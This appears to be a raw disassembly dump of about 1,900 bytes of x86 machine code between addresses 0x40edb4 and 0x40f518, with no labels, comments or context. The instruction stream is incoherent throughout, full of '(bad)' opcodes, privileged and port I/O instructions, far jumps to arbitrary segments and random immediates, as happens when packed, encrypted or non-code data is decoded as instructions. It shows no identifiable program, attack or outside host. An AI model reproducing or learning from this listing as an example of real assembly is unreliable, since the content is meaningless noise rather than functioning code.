  40edb4:	ins    DWORD PTR es:[edi],dx
  40edb5:	out    0x72,al
  40edb7:	push   edx
  40edb8:	icebp  
  40edb9:	(bad)  
  40edbb:	in     al,dx
  40edbc:	jnp    0x40ed3f
  40edbe:	xchg   esp,eax
  40edbf:	inc    ebp
  40edc0:	mov    edi,0xe462201c
  40edc5:	and    DWORD PTR [eax+0x5d],0x3
  40edc9:	mov    ecx,0x9a167140
  40edce:	fimul  WORD PTR [eax+0x38]
  40edd1:	adc    dl,BYTE PTR [eax]
  40edd3:	xchg   ecx,eax
  40edd4:	mov    ebp,0x39417df0
  40edd9:	and    eax,0x260bc2c4
  40edde:	cmp    eax,0x171b5eba
  40ede3:	cmp    eax,0xaf4bfbea
  40ede8:	sbb    eax,0xdf6bdafb
  40eded:	in     al,0x51
  40edef:	cwde   
  40edf0:	out    0xf6,al
  40edf2:	inc    ecx
  40edf3:	and    bl,BYTE PTR [ecx]
  40edf5:	cmc    
  40edf6:	enter  0x883f,0xe0
  40edfa:	xor    al,0x34
  40edfc:	jmp    0x8ce08844
  40ee01:	and    eax,0x7e2459f6
  40ee06:	repz mov al,0xf6
  40ee09:	push   ebp
  40ee0a:	mov    bh,0xc5
  40ee0c:	jg     0x40edb2
  40ee0e:	in     eax,0x59
  40ee10:	stos   DWORD PTR es:[edi],eax
  40ee11:	inc    edx
  40ee12:	mov    esp,0xb6551552
  40ee17:	adc    eax,0x46a3564d
  40ee1c:	fimul  DWORD PTR [edi+0xd]
  40ee1f:	xor    dl,al
  40ee21:	inc    eax
  40ee22:	(bad)  
  40ee24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ee25:	and    BYTE PTR [edx+0x34],al
  40ee28:	xchg   edi,eax
  40ee29:	add    cl,0x7f
  40ee2c:	xchg   esp,eax
  40ee2d:	cli    
  40ee2e:	mov    dh,0x3a
  40ee30:	adc    DWORD PTR [edi-0x5f],edx
  40ee33:	push   DWORD PTR [ebx+0x6484448a]
  40ee39:	jmp    0xd7576b1e
  40ee3e:	mov    dl,0x6
  40ee40:	pop    esp
  40ee41:	dec    eax
  40ee42:	loopne 0x40ee57
  40ee44:	inc    esp
  40ee45:	clc    
  40ee46:	cmp    bh,cl
  40ee48:	jo     0x40ee2c
  40ee4a:	inc    ebx
  40ee4b:	inc    ebx
  40ee4c:	and    DWORD PTR [eax+0x37],edx
  40ee4f:	dec    esp
  40ee50:	rcr    DWORD PTR [esi],cl
  40ee52:	mov    cl,0x82
  40ee54:	sbb    eax,0x7332b421
  40ee59:	xor    DWORD PTR [ecx+0x7e],0x2fcbe628
  40ee60:	mov    cs,ebx
  40ee62:	mov    ch,0xaf
  40ee64:	mov    eax,ds
  40ee66:	jmp    0xeb7e8883
  40ee6b:	cwde   
  40ee6c:	inc    edx
  40ee6d:	push   ss
  40ee6e:	push   ss
  40ee6f:	out    0x67,eax
  40ee71:	dec    esp
  40ee72:	sbb    ebx,DWORD PTR [ebx+0x2f]
  40ee75:	xlat   BYTE PTR ds:[ebx]
  40ee76:	sahf   
  40ee77:	int3   
  40ee78:	pop    ebx
  40ee79:	or     BYTE PTR [ebp-0xc],0xad
  40ee7d:	cs add al,0x95
  40ee80:	xchg   DWORD PTR [edi+0x17e2b983],esp
  40ee86:	test   DWORD PTR [edx+0x11],edx
  40ee89:	pop    ebx
  40ee8a:	mov    gs,WORD PTR [ebx]
  40ee8c:	jae    0x40ee58
  40ee8e:	repz and eax,0xb86db676
  40ee94:	pop    ebx
  40ee95:	fsub   DWORD PTR [edx-0x3b]
  40ee98:	jmp    0xf26224a4
  40ee9d:	lahf   
  40ee9e:	stos   BYTE PTR es:[edi],al
  40ee9f:	les    edi,FWORD PTR [eax-0x37]
  40eea2:	inc    esi
  40eea3:	dec    eax
  40eea4:	mov    ebx,0xf4f78808
  40eea9:	dec    esp
  40eeaa:	out    0x5b,al
  40eeac:	inc    edx
  40eead:	push   ss
  40eeae:	in     eax,dx
  40eeaf:	jl     0x40eeab
  40eeb1:	jno    0x40eeae
  40eeb3:	fwait
  40eeb4:	inc    ebp
  40eeb5:	xor    eax,0x29676f9
  40eeba:	(bad)  
  40eebb:	mov    gs,WORD PTR [edx+eiz*4+0x2804b2cf]
  40eec2:	fs out 0xbb,al
  40eec5:	repz or eax,0x3752d989
  40eecb:	hlt    
  40eecc:	fadd   QWORD PTR [edi-0x5]
  40eecf:	push   0xffffffc5
  40eed1:	cli    
  40eed2:	or     al,0x6a
  40eed4:	jae    0x40ef0e
  40eed6:	mov    al,ds:0x609319b5
  40eedb:	dec    bp
  40eedd:	test   eax,0xf834c52a
  40eee2:	jb     0x40eeb2
  40eee4:	dec    ebp
  40eee5:	lds    ecx,FWORD PTR [ecx]
  40eee7:	jg     0x40eed6
  40eee9:	push   ebp
  40eeea:	mov    esp,0x6e26f5ed
  40eeef:	mov    ebp,0xe149f0ce
  40eef4:	std    
  40eef5:	retf   0xf3a0
  40eef8:	mov    ss,WORD PTR [edi-0x77]
  40eefb:	fcom   DWORD PTR [eax-0x923a5e4]
  40ef01:	call   0xb5ff0d20
  40ef06:	div    DWORD PTR [ebp+0x3a]
  40ef09:	(bad)  
  40ef0a:	sub    ebx,ebp
  40ef0c:	jge    0x40ef2c
  40ef0e:	js     0x40ee9c
  40ef10:	mov    ah,BYTE PTR [eax-0x2903666d]
  40ef16:	jge    0x40eea0
  40ef18:	(bad)  
  40ef1a:	xchg   DWORD PTR [esi],ebp
  40ef1c:	aaa    
  40ef1d:	js     0x40ef56
  40ef1f:	jo     0x40eec3
  40ef21:	jb     0x40eed6
  40ef23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef24:	jb     0x40ef52
  40ef26:	popa   
  40ef27:	add    dh,BYTE PTR [ebx+ebp*2]
  40ef2a:	push   eax
  40ef2b:	test   al,0x24
  40ef2d:	jae    0x40ef71
  40ef2f:	jo     0x40ef78
  40ef31:	pop    ebx
  40ef32:	or     bh,BYTE PTR [edx]
  40ef34:	daa    
  40ef35:	sbb    dh,BYTE PTR [esi+ecx*2+0x1f0a388b]
  40ef3c:	popf   
  40ef3d:	jns    0x40efac
  40ef3f:	xor    al,0x3
  40ef41:	ins    BYTE PTR es:[edi],dx
  40ef42:	loopne 0x40ef0e
  40ef44:	mov    ss:0xf6622bd2,eax
  40ef4a:	dec    ebx
  40ef4b:	out    dx,eax
  40ef4c:	fwait
  40ef4d:	mov    bl,0x84
  40ef4f:	fscale 
  40ef51:	in     al,dx
  40ef52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef53:	data16 scas al,BYTE PTR es:[edi]
  40ef55:	inc    esi
  40ef56:	fdivr  QWORD PTR [edx-0xa]
  40ef59:	call   0x1aba:0x7a42d6ba
  40ef60:	sbb    eax,0x84a62f3d
  40ef65:	js     0x40efb3
  40ef67:	fs and edi,esi
  40ef6a:	out    dx,al
  40ef6b:	(bad)  
  40ef6c:	je     0x40ef8c
  40ef6e:	sub    al,0x57
  40ef70:	int    0x2b
  40ef72:	inc    esp
  40ef73:	cmp    DWORD PTR [edx],edx
  40ef75:	shl    BYTE PTR [ebx],0x74
  40ef78:	pushf  
  40ef79:	int3   
  40ef7a:	out    dx,al
  40ef7b:	(bad)  
  40ef7c:	mov    ds:0x662d8980,al
  40ef81:	push   0xffffff90
  40ef83:	adc    BYTE PTR [edi-0x57cc7c84],0xe8
  40ef8a:	sbb    ebp,esi
  40ef8c:	aas    
  40ef8d:	pop    esi
  40ef8e:	fwait
  40ef8f:	sub    al,BYTE PTR [edx-0x16]
  40ef92:	inc    eax
  40ef93:	(bad)  
  40ef94:	mov    ecx,0x6c71903f
  40ef99:	fst    QWORD PTR [eax-0x20]
  40ef9c:	sbb    bl,dh
  40ef9e:	and    dl,cl
  40efa0:	fadd   st,st(6)
  40efa2:	push   ecx
  40efa3:	int    0xd
  40efa5:	jbe    0x40ef5b
  40efa7:	add    edx,DWORD PTR [esi+0x12b083e4]
  40efad:	retf   0xd093
  40efb0:	xor    DWORD PTR [esi+0x3f],esi
  40efb3:	pop    edx
  40efb4:	add    BYTE PTR [esi+0x5cda3d1c],dl
  40efba:	(bad)  
  40efbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40efbc:	xlat   BYTE PTR ds:[ebx]
  40efbd:	pop    eax
  40efbe:	(bad)  
  40efc0:	ss inc ecx
  40efc2:	mov    ch,0xf4
  40efc4:	(bad)  [ebp-0x3341f84]
  40efca:	and    eax,0x500e74ab
  40efcf:	pop    edx
  40efd0:	push   0x64813cd3
  40efd5:	push   esp
  40efd6:	push   ebx
  40efd7:	cmp    DWORD PTR [ecx-0x3276550d],edx
  40efdd:	jmp    0x40efa9
  40efdf:	jb     0x40f046
  40efe1:	fmul   DWORD PTR [ebx+0x2d499bee]
  40efe7:	xor    BYTE PTR [edi-0x249d13ce],cl
  40efed:	scas   al,BYTE PTR es:[edi]
  40efee:	or     eax,0xb80c5fbf
  40eff3:	mov    ch,0x39
  40eff5:	enter  0xebac,0x97
  40eff9:	mov    dl,0xd2
  40effb:	loop   0x40efa4
  40effd:	pop    esi
  40effe:	push   0xd0d54652
  40f003:	jmp    0xafbacab3
  40f008:	and    DWORD PTR [ebx],eax
  40f00a:	out    dx,eax
  40f00b:	mov    ebx,0x8ca95284
  40f010:	lds    esi,FWORD PTR [ebx+eiz*1]
  40f013:	sar    BYTE PTR [esi],cl
  40f015:	xchg   ebp,eax
  40f016:	cwde   
  40f017:	xchg   ebx,eax
  40f018:	add    DWORD PTR [edx+0x3b],0x76432347
  40f01f:	test   ebx,edi
  40f021:	aam    0xf
  40f023:	cmp    eax,0x50b95b84
  40f028:	jmp    0x14835bd7
  40f02d:	cmp    dh,ah
  40f02f:	sub    dl,BYTE PTR [ecx-0x10ae40ea]
  40f035:	sub    eax,ecx
  40f037:	adc    DWORD PTR [ecx+0x64705f68],0x3b624f65
  40f041:	das    
  40f042:	jae    0x40efd8
  40f044:	mov    ah,0xca
  40f046:	sahf   
  40f047:	jmp    0x2043:0xc04e905f
  40f04e:	stos   DWORD PTR es:[edi],eax
  40f04f:	jmp    0x40f073
  40f051:	std    
  40f052:	mov    cl,0x84
  40f054:	out    0xcc,al
  40f056:	stos   BYTE PTR es:[edi],al
  40f057:	(bad)  
  40f058:	clc    
  40f059:	es mov dh,0x24
  40f05c:	pop    ss
  40f05d:	mov    WORD PTR [esi+0x13e4f63f],ss
  40f063:	icebp  
  40f064:	and    al,0x8
  40f066:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f067:	cmp    ebp,0xffffffa7
  40f06a:	daa    
  40f06b:	cmp    DWORD PTR [ecx-0x30],0x68
  40f06f:	jl     0x40f060
  40f071:	mov    esp,0xed5bd39
  40f076:	cs jecxz 0x40f057
  40f079:	inc    edi
  40f07a:	ins    BYTE PTR es:[edi],dx
  40f07b:	or     bh,BYTE PTR [esi]
  40f07d:	adc    cl,bh
  40f07f:	sar    DWORD PTR [ebp+0x62],0x5f
  40f083:	jbe    0x40f0a1
  40f085:	jl     0x40f0f5
  40f087:	jle    0x40f0af
  40f089:	xor    DWORD PTR [ebp-0x24],ebx
  40f08c:	add    BYTE PTR [ebx],0x2e
  40f08f:	fmul   DWORD PTR [edx]
  40f091:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f092:	gs dec esi
  40f094:	(bad)  
  40f095:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f096:	xchg   ecx,eax
  40f097:	aas    
  40f098:	scas   al,BYTE PTR es:[edi]
  40f099:	aad    0x47
  40f09b:	mov    bh,bl
  40f09d:	mov    ebx,0x6674326f
  40f0a2:	jbe    0x40f068
  40f0a4:	jl     0x40f0a9
  40f0a6:	adc    DWORD PTR [esi+0x17],ebp
  40f0a9:	popa   
  40f0aa:	outs   dx,BYTE PTR ds:[esi]
  40f0ab:	lods   al,BYTE PTR ds:[esi]
  40f0ac:	pop    ds
  40f0ad:	jno    0x40f0d2
  40f0af:	dec    edi
  40f0b0:	adc    ch,bl
  40f0b2:	jb     0x40f0ce
  40f0b4:	mov    dl,0xd1
  40f0b6:	loop   0x40f04c
  40f0b8:	sbb    DWORD PTR [edi+0x4ebb8f21],0xffffff9c
  40f0bf:	nop
  40f0c0:	adc    al,0xe4
  40f0c2:	fsub   DWORD PTR [esi]
  40f0c4:	push   es
  40f0c5:	dec    esp
  40f0c6:	add    al,0xcd
  40f0c8:	ror    ah,1
  40f0ca:	out    dx,eax
  40f0cb:	(bad)  
  40f0cc:	call   0x9bd7c489
  40f0d1:	push   esi
  40f0d2:	mov    dl,0xe3
  40f0d4:	call   0xdb3d8533
  40f0d9:	mov    esi,0x62d3e445
  40f0de:	mov    WORD PTR [ebp+0x66],?
  40f0e1:	icebp  
  40f0e2:	or     BYTE PTR [edi],dh
  40f0e4:	xorps  xmm2,XMMWORD PTR [ecx]
  40f0e7:	rep outs dx,DWORD PTR ds:[esi]
  40f0e9:	les    ecx,FWORD PTR [eax+0x7cc02cf9]
  40f0ef:	jecxz  0x40f13a
  40f0f1:	push   cs
  40f0f2:	jns    0x40f10f
  40f0f4:	clc    
  40f0f5:	repnz add BYTE PTR [eax],0x2
  40f0f9:	icebp  
  40f0fa:	mov    esp,0x9beaeb09
  40f0ff:	int    0xe3
  40f101:	std    
  40f102:	(bad)  
  40f103:	das    
  40f104:	add    dh,BYTE PTR [ebp-0x26]
  40f107:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f108:	inc    edi
  40f109:	adc    BYTE PTR [esi-0x3],dh
  40f10c:	jmp    0x578:0x3a88e3f7
  40f113:	fstp   QWORD PTR [edi+0x4f]
  40f116:	xor    BYTE PTR [edx+0x1dcc0735],bl
  40f11c:	das    
  40f11d:	xlat   BYTE PTR ds:[ebx]
  40f11e:	test   eax,0x94b016a5
  40f123:	adc    eax,0x89290823
  40f128:	jae    0x40f102
  40f12a:	push   cs
  40f12b:	iret   
  40f12c:	mov    bl,0x71
  40f12e:	outs   dx,DWORD PTR ds:[esi]
  40f12f:	push   ss
  40f130:	xchg   ebx,eax
  40f131:	cmp    DWORD PTR [esi],ebp
  40f133:	xchg   esp,eax
  40f134:	das    
  40f135:	jp     0x40f18a
  40f137:	popa   
  40f138:	xor    ecx,edx
  40f13a:	jbe    0x40f0c4
  40f13c:	in     eax,dx
  40f13d:	mov    WORD PTR [ecx-0x10],ss
  40f140:	push   esp
  40f141:	pop    ds
  40f142:	jb     0x40f11b
  40f144:	out    dx,eax
  40f145:	jb     0x40f1ab
  40f147:	sub    BYTE PTR [esi-0x62],dl
  40f14a:	cwde   
  40f14b:	test   al,0x8
  40f14d:	addr16 dec edi
  40f14f:	shl    BYTE PTR [eax-0x63c6b66e],1
  40f155:	hlt    
  40f156:	sti    
  40f157:	mov    BYTE PTR [eax+0x1],ch
  40f15a:	jl     0x40f1b3
  40f15c:	test   eax,0x456afc65
  40f161:	mov    dh,cl
  40f163:	dec    edi
  40f164:	hlt    
  40f165:	mov    ch,0xad
  40f167:	push   edx
  40f168:	gs sub esp,ebp
  40f16b:	jae    0x40f154
  40f16d:	icebp  
  40f16e:	adc    BYTE PTR [ecx],dh
  40f170:	lss    eax,FWORD PTR [ecx+0x2a7fac3e]
  40f177:	sbb    bl,BYTE PTR [esi]
  40f179:	adc    ch,cl
  40f17b:	mov    esp,0xfad6cc27
  40f180:	or     ebp,DWORD PTR [edx+0x3451e891]
  40f186:	adc    ch,BYTE PTR [ebp+0x77]
  40f189:	out    dx,al
  40f18a:	fadd   QWORD PTR [eax+eax*8]
  40f18d:	mov    dl,0x44
  40f18f:	mov    ebp,0x7b73ff56
  40f194:	shr    DWORD PTR [edi+edx*8],cl
  40f197:	jl     0x40f19d
  40f199:	push   eax
  40f19a:	xlat   BYTE PTR ds:[ebx]
  40f19b:	sbb    eax,0x2cabd174
  40f1a0:	rcr    esi,1
  40f1a2:	pop    ebp
  40f1a3:	cmp    ecx,DWORD PTR [eax]
  40f1a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f1a6:	sub    ebx,DWORD PTR [edi]
  40f1a8:	mov    edx,fs
  40f1aa:	fcom   DWORD PTR [eax+0x43]
  40f1ad:	test   eax,0xd704f013
  40f1b2:	pusha  
  40f1b3:	fwait
  40f1b4:	aam    0x47
  40f1b6:	cmp    DWORD PTR [edi+ebp*8+0x6a],ebx
  40f1ba:	add    eax,0xa76c818a
  40f1bf:	jmp    0xf66b:0x7394d04
  40f1c6:	sbb    al,0x4c
  40f1c8:	push   edi
  40f1c9:	xchg   ecx,eax
  40f1ca:	cmp    ah,cl
  40f1cc:	jp     0x40f1dc
  40f1ce:	scas   al,BYTE PTR es:[edi]
  40f1cf:	mov    ds:0x4bf8827e,al
  40f1d4:	push   esp
  40f1d5:	das    
  40f1d6:	and    DWORD PTR [ebx-0x59],ebx
  40f1d9:	mov    esp,0x8e78e219
  40f1de:	jb     0x40f19a
  40f1e0:	(bad)  
  40f1e1:	pop    ebx
  40f1e2:	int3   
  40f1e3:	leave  
  40f1e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f1e5:	mov    ds:0xf93fe6b3,eax
  40f1ea:	test   eax,0xa113f7d9
  40f1ef:	xchg   ecx,eax
  40f1f0:	sub    al,0xb8
  40f1f2:	scas   eax,DWORD PTR es:[edi]
  40f1f3:	dec    ebp
  40f1f4:	push   edi
  40f1f5:	into   
  40f1f6:	dec    eax
  40f1f7:	and    al,0xc6
  40f1f9:	xor    esp,ebx
  40f1fb:	imul   esp,DWORD PTR [eax+0x53],0xffffffbb
  40f1ff:	lock ds push esi
  40f202:	cwde   
  40f203:	sub    ebx,DWORD PTR [edx+0x54]
  40f206:	nop
  40f207:	pop    es
  40f208:	sbb    DWORD PTR [eax+0x2e2b49e6],edx
  40f20e:	and    edi,DWORD PTR [edx-0x20e2337c]
  40f214:	mov    edx,DWORD PTR [edi+0x22]
  40f217:	add    al,0x76
  40f219:	bound  edi,QWORD PTR [esi+ebx*4+0x50e4676a]
  40f220:	mov    ecx,edi
  40f222:	mov    ds:0xebb806e4,al
  40f227:	call   0x30b9:0xa2b76119
  40f22e:	push   ebp
  40f22f:	push   es
  40f230:	call   0xfa482448
  40f235:	adc    BYTE PTR [ecx+0x57],bl
  40f238:	les    esp,FWORD PTR [edx]
  40f23a:	jo     0x40f2a8
  40f23c:	mov    bl,0xc2
  40f23e:	dec    esi
  40f23f:	push   eax
  40f240:	jmp    0x40f211
  40f242:	je     0x40f1ec
  40f244:	mov    esi,DWORD PTR [edx]
  40f246:	mov    ebp,0x983c9ce3
  40f24b:	jnp    0x40f276
  40f24d:	jb     0x40f26c
  40f24f:	inc    edi
  40f250:	pop    ss
  40f251:	and    edi,DWORD PTR [edx]
  40f253:	(bad)  [esi+0x47bb6302]
  40f259:	push   eax
  40f25a:	pop    ss
  40f25b:	pop    ebx
  40f25c:	pop    ds
  40f25d:	add    esi,DWORD PTR [edi+0x7d667ee1]
  40f263:	push   ebp
  40f264:	mov    al,0x49
  40f266:	adc    al,0x22
  40f268:	out    0x65,al
  40f26a:	dec    edx
  40f26b:	lahf   
  40f26c:	fcom   st(4)
  40f26e:	popa   
  40f26f:	leave  
  40f270:	mov    edi,0x9ac1d220
  40f275:	jl     0x40f2bc
  40f277:	in     al,dx
  40f278:	mov    WORD PTR [ebx+edx*8],ds
  40f27b:	aaa    
  40f27c:	(bad)  
  40f27d:	ficom  DWORD PTR [esi-0x5a]
  40f280:	mov    al,dh
  40f282:	fsubr  DWORD PTR [edi]
  40f284:	lods   al,BYTE PTR ds:[esi]
  40f285:	shl    esi,cl
  40f287:	jmp    0x1d10:0x4874dcc5
  40f28e:	dec    BYTE PTR [esi+0x64a679bf]
  40f294:	mov    dh,0x75
  40f296:	dec    edi
  40f297:	add    DWORD PTR [esi-0x15],eax
  40f29a:	ss (bad) 
  40f29d:	dec    eax
  40f29e:	aaa    
  40f29f:	xchg   BYTE PTR [edi],dl
  40f2a1:	xor    dh,ch
  40f2a3:	(bad)  
  40f2a4:	iret   
  40f2a5:	(bad)  
  40f2a6:	xor    bl,dl
  40f2a8:	loope  0x40f2f6
  40f2aa:	push   ebx
  40f2ab:	mov    ah,0xcc
  40f2ad:	sub    edi,DWORD PTR [ebx]
  40f2af:	cmp    ecx,DWORD PTR [esi-0x3b]
  40f2b2:	loope  0x40f305
  40f2b4:	push   esp
  40f2b5:	fist   WORD PTR [ebx+0x66c13e58]
  40f2bb:	push   ebx
  40f2bc:	clc    
  40f2bd:	or     al,0xb8
  40f2bf:	int    0x12
  40f2c1:	jmp    0x40f2b5
  40f2c3:	cld    
  40f2c4:	add    BYTE PTR [edx],0x22
  40f2c7:	and    al,0x36
  40f2c9:	or     bh,BYTE PTR [ebp+0x52f11e03]
  40f2cf:	jmp    0xee600117
  40f2d4:	lock scas al,BYTE PTR es:[edi]
  40f2d6:	sbb    ah,bh
  40f2d8:	or     cl,dl
  40f2da:	xor    DWORD PTR [esi-0x39a9baf1],0xfcd73377
  40f2e4:	or     esi,ebp
  40f2e6:	dec    edx
  40f2e7:	add    al,0x7b
  40f2e9:	add    BYTE PTR [esi+0x2819581f],al
  40f2ef:	mov    ebx,0x303fb693
  40f2f4:	ffree  st(2)
  40f2f6:	sub    bl,ch
  40f2f8:	or     esp,DWORD PTR [ebx+0x1bac17a4]
  40f2fe:	push   0xfafa0631
  40f303:	mov    es,WORD PTR [ebx]
  40f305:	mov    ecx,0x45bd62ba
  40f30a:	mov    al,0xea
  40f30c:	sub    BYTE PTR [ebx],bl
  40f30e:	mov    edi,0x47eaf8b9
  40f313:	inc    esi
  40f314:	xor    BYTE PTR fs:[esi-0x7df33715],0xb
  40f31c:	inc    eax
  40f31d:	mov    ebp,0xacd0ff9b
  40f322:	outs   dx,DWORD PTR ds:[esi]
  40f323:	(bad)  
  40f324:	das    
  40f325:	and    dh,BYTE PTR [eax-0x2011f1f]
  40f32b:	ins    BYTE PTR es:[edi],dx
  40f32c:	mov    edx,DWORD PTR [edx+0x51]
  40f32f:	lods   eax,DWORD PTR ds:[esi]
  40f330:	xor    ebx,DWORD PTR ds:0x58e8c784
  40f336:	jb     0x40f2be
  40f338:	xlat   BYTE PTR ds:[ebx]
  40f339:	cmp    esp,edx
  40f33b:	outs   dx,BYTE PTR ds:[esi]
  40f33c:	iret   
  40f33d:	xor    al,0xaf
  40f33f:	jnp    0x40f36c
  40f341:	sti    
  40f342:	pop    esi
  40f343:	ret    
  40f344:	pop    ss
  40f345:	or     BYTE PTR [edi+eax*4+0x2f],dh
  40f349:	adc    al,BYTE PTR [edi]
  40f34b:	cli    
  40f34c:	xchg   esp,eax
  40f34d:	xor    ebx,DWORD PTR [esi+0x260a6eb9]
  40f353:	mov    ch,0xf6
  40f355:	pop    esi
  40f356:	les    eax,FWORD PTR [ebp+0x32277c4d]
  40f35c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f35d:	add    ch,BYTE PTR [ebx-0x26dafd8e]
  40f363:	adc    eax,edi
  40f365:	fstp   TBYTE PTR [ecx+0x2d]
  40f368:	je     0x40f324
  40f36a:	xor    al,0x79
  40f36c:	mov    edx,DWORD PTR [edi-0x19]
  40f36f:	fs pop eax
  40f371:	xchg   ecx,eax
  40f372:	adc    eax,0x2664b50a
  40f377:	mov    BYTE PTR ds:0x161f7151,bl
  40f37d:	pop    edx
  40f37e:	bound  eax,QWORD PTR ds:0x65af9872
  40f384:	out    dx,eax
  40f385:	pusha  
  40f386:	pop    es
  40f387:	mov    ch,0x3b
  40f389:	mov    ds:0x2fc508f4,eax
  40f38e:	xchg   edx,eax
  40f38f:	or     ah,ah
  40f391:	out    dx,eax
  40f392:	mov    ebx,0xd202d920
  40f397:	or     BYTE PTR [ebx+ebp*1+0x3b],bl
  40f39b:	mov    edx,0x396accee
  40f3a0:	cmp    ebx,0xfffffffe
  40f3a3:	shl    DWORD PTR [ebx-0x77],0x8b
  40f3a7:	popf   
  40f3a8:	int3   
  40f3a9:	ss push esi
  40f3ab:	fcomi  st,st(5)
  40f3ad:	cmp    eax,0x8266f094
  40f3b2:	xchg   edx,eax
  40f3b3:	pop    eax
  40f3b4:	ins    BYTE PTR es:[edi],dx
  40f3b5:	sti    
  40f3b6:	add    BYTE PTR [ebx],ah
  40f3b8:	repnz (bad) 
  40f3bb:	(bad)
  40f3be:	sub    ch,BYTE PTR [esi+ecx*4]
  40f3c1:	mov    cl,0xdc
  40f3c3:	sub    cl,BYTE PTR [esi-0x239d93c7]
  40f3c9:	aas    
  40f3ca:	dec    ebx
  40f3cb:	mov    ebx,0xd01eea7b
  40f3d0:	mov    esp,0x21565856
  40f3d5:	mov    dh,BYTE PTR [eax-0x3889206a]
  40f3db:	xor    BYTE PTR ds:0xa3a37631,cl
  40f3e1:	cwde   
  40f3e2:	xor    ebp,DWORD PTR [ecx+0x47585948]
  40f3e8:	dec    esp
  40f3e9:	(bad)
  40f3ec:	jl     0x40f3a2
  40f3ee:	dec    eax
  40f3ef:	sub    ch,dh
  40f3f1:	xor    bh,BYTE PTR [esi+0x28]
  40f3f4:	push   cs
  40f3f5:	into   
  40f3f6:	xchg   BYTE PTR [esp+eiz*8],bl
  40f3f9:	shr    ebp,0x48
  40f3fc:	xchg   ebx,eax
  40f3fd:	xchg   ebx,eax
  40f3fe:	xchg   BYTE PTR [ecx+0x44],ch
  40f401:	outs   dx,DWORD PTR ds:[esi]
  40f402:	jo     0x40f3c5
  40f404:	test   DWORD PTR [ecx-0x21],eax
  40f407:	adc    bh,bl
  40f409:	ja     0x40f39b
  40f40b:	add    ecx,0xffffffbb
  40f40e:	mov    al,0xc0
  40f410:	and    bl,BYTE PTR [ebx+0x35db3a39]
  40f416:	xor    DWORD PTR [ecx+0x6b3e1255],edi
  40f41c:	dec    ebx
  40f41d:	shl    DWORD PTR [ecx+0x42],cl
  40f420:	push   0xb02eafda
  40f425:	repz and esi,esp
  40f428:	repz mov ch,0x6
  40f42b:	xchg   edi,ebp
  40f42d:	cmp    BYTE PTR [esi+0xc6fa0fa],dh
  40f433:	cld    
  40f434:	cmp    eax,0x849551dd
  40f439:	xor    ecx,ebx
  40f43b:	loope  0x40f3e1
  40f43d:	mov    edx,0xeb60c939
  40f442:	jmp    0xbdca:0x8655e9b7
  40f449:	sub    BYTE PTR [edi],ch
  40f44b:	jmp    0x40f4b0
  40f44d:	adc    eax,edi
  40f44f:	jmp    0x40f4b4
  40f451:	xlat   BYTE PTR ds:[ebx]
  40f452:	jns    0x40f4c9
  40f454:	mov    edi,DWORD PTR [edi-0x16]
  40f457:	and    BYTE PTR [edx],dh
  40f459:	mov    cl,0x9c
  40f45b:	ror    ecx,1
  40f45d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f45e:	inc    esi
  40f45f:	ds dec edx
  40f461:	es (bad) 
  40f463:	scas   al,BYTE PTR es:[edi]
  40f464:	and    eax,0xd8f31dbc
  40f469:	inc    edi
  40f46a:	jno    0x40f407
  40f46c:	or     BYTE PTR [edi+0x8],bh
  40f46f:	inc    eax
  40f470:	fild   WORD PTR [esi-0x72]
  40f473:	out    0x44,al
  40f475:	cs das 
  40f477:	ds cdq 
  40f479:	and    edx,ebx
  40f47b:	repnz mov esp,DWORD PTR [ecx+0x21]
  40f47f:	mov    edi,0x29bc1ef
  40f484:	lock clts 
  40f487:	push   ss
  40f488:	jae    0x40f4d2
  40f48a:	sub    dh,BYTE PTR [edx+0x343dae23]
  40f490:	pushf  
  40f491:	push   ecx
  40f492:	sub    BYTE PTR [esi],dh
  40f494:	fstp   st(3)
  40f496:	dec    esp
  40f497:	sbb    al,0xf0
  40f499:	jp     0x40f50f
  40f49b:	push   0x50
  40f49d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f49e:	out    dx,eax
  40f49f:	jns    0x40f45b
  40f4a1:	push   eax
  40f4a2:	jle    0x40f471
  40f4a4:	mov    eax,0x1b9bfbea
  40f4a9:	pop    esp
  40f4aa:	cmp    eax,0xe53b285
  40f4af:	xchg   BYTE PTR [eax+0x6868ee8d],dl
  40f4b5:	pusha  
  40f4b6:	push   edx
  40f4b7:	mov    esi,0xe2df9045
  40f4bc:	xchg   ebp,eax
  40f4bd:	and    eax,0x66e84b5d
  40f4c2:	(bad)
  40f4c5:	adc    bh,dh
  40f4c7:	sub    eax,0x37445a71
  40f4cc:	mov    al,0x5f
  40f4ce:	nop
  40f4cf:	inc    esp
  40f4d0:	inc    esp
  40f4d1:	dec    esp
  40f4d2:	sbb    BYTE PTR [esi+0x156f533c],al
  40f4d8:	jecxz  0x40f4b4
  40f4da:	scas   eax,DWORD PTR es:[edi]
  40f4db:	lahf   
  40f4dc:	pop    ebp
  40f4dd:	adc    DWORD PTR [edx-0x4fb1fcb5],edx
  40f4e3:	mov    DWORD PTR [edx+edx*1+0x4eb5bbe9],ecx
  40f4ea:	out    dx,eax
  40f4eb:	sub    DWORD PTR [ebx+0x68],ecx
  40f4ee:	imul   al
  40f4f0:	push   ebp
  40f4f1:	adc    al,BYTE PTR [edi]
  40f4f3:	push   edx
  40f4f4:	lods   al,BYTE PTR ds:[esi]
  40f4f5:	jle    0x40f4ee
  40f4f7:	mov    ds:0x9a1b0e6f,al
  40f4fc:	test   al,0x34
  40f4fe:	and    ebp,DWORD PTR [edi-0x5ed50510]
  40f504:	jg     0x40f573
  40f506:	sub    eax,0xd6b403b1
  40f50b:	pop    esp
  40f50c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f50d:	pop    eax
  40f50e:	push   cs
  40f50f:	inc    eax
  40f510:	adc    al,0x1b
  40f512:	ss sub eax,0x21b7dfbe
  40f518:	dec    ecx
